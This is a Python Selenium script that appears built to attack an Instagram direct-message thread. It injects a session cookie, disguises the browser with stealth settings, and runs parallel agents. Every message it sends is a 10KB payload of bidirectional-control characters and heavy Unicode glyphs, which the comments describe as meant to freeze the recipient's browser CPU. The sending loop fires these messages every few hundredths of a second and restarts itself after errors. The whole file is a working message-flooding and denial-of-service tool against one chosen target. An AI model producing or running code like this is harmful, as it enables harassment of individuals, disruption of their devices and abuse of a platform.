# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (SATURATOR V69)
# 📅 STATUS: MAIN-THREAD-HIJACK | 4-AGENT TOTAL | AWS-CPU-KILL

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.01, 0.05)  # 🔥 MAXIMUM PACKET DENSITY
REST_AFTER_STRIKES = 250   
REST_DURATION = 2          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_instruction_saturator_payload():
    """Generates a high-entropy payload that forces C++ context switches."""
    u_id = random.randint(100, 999)
    
    # 𒀱 = Cuneiform (4-byte) | ﷽ = Bismillah (Wide Ligature) 
    # \u2066 = LRI | \u2067 = RLI | \u034F = CGJ
    lri, rli, cgj = "\u2066", "\u2067", "\u034F"
    heavy_chars = ["𒀱", "﷽", "𒈙", "𒈓", "𒈔", "𒈕"]
    glue = "\u2060" # Word Joiner
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [SATURATION_LOCK:{u_id}]"
    
    body = []
    # 430 lines - Hitting the absolute 10KB socket limit
    for i in range(430):
        random.shuffle(heavy_chars)
        # We alternate direction for EVERY character. 
        # This prevents the browser from using 'Run-Segment' optimization.
        # It forces the CPU to stop and re-check the BiDi stack 100+ times per line.
        line = ""
        for char in heavy_chars:
            line += f"{lri}{char}{cgj}{rli}"
        
        body.append(f"PRAVEER PAPA {line} {i}{glue*4}")
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Direct DOM injection with zero-latency framework state sync."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                document.execCommand('insertText', false, arguments[0]);
                
                // Force sync for React/Angular/Vue internals
                box.dispatchEvent(new Event('input', { bubbles: true }));
                
                // Fire Native Keyboard Event
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(12) 
            
            strike_count = 0
            while True:
                payload = get_instruction_saturator_payload()
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Saturation-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 80 == 0:
                        driver.refresh()
                        time.sleep(5)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(2)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
